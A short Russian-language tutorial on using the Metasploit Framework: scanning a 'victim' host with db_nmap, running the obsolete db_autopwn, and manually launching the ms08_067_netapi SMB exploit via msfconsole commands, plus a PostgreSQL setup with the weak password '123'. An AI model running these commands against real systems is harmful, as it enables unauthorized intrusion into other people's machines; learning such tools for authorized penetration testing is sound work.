# Metasploit instalation

> For docker: https://wiki-docs.ru/home/sec/metasploit-docker
## После установки:

Теперь самый простой вариант использования Metasploit Framework. Запустим консоль.

`msfconsole`

Теперь добавим нашу жертву в базу данных и информацию про его порты.

`db_nmap -sT -sV 192.168.1.1`

Отправим все на автоматический взлом =). Данная команда стала неактуальной в последних версиях.

`db_autopwn -p -t -e`

Если в конце процесса появятся сессии, значит взлом удался. Выбираем сессию и в ходим в нее.

`session -i 1`

Альтернатив db_autopwn нет. Использовать эксплоиты можно в ручную. Например так:

#Загружаем нужный нам эксплоит

`use exploit/windows/smb/ms08_067_netapi`

#Смотрим опции

`show options`

#Заполняем необходимые поля например IP адрес жертвы

`set RHOST 192.168.84.58`

#Проверяем актуален ли эксплоит для жертвы

`check`

#Ломаем

`exploit`

Далее можно заняться многим, все зависит от ваших полномочий в системе. Для просмотра команд доступных Вам наберите:

`help`

В конце для выхода обратно из сессии и удаления данного хоста из базы данных проделываем следующую операцию:

`exit`
`hosts -d 192.168.1.1`

Иногда Базы данных отваливаются я решил данный вопрос вот так:

sudo apt-get install postgresql
sudo apt-get install libpgsql-ruby
sudo su postgres
createuser root -P
Enter password for new role: 123
Enter it again:123
Shall the new role be a
superuser? (y/n) n
Shall the new role be allowed to
create databases? (y/n) n
Shall the new role be allowed to
create more new roles? (y/n) n
createdb --owner=root metasploit
exit
msfconsole
db_connect root:123@127.0.0.1/metasploit
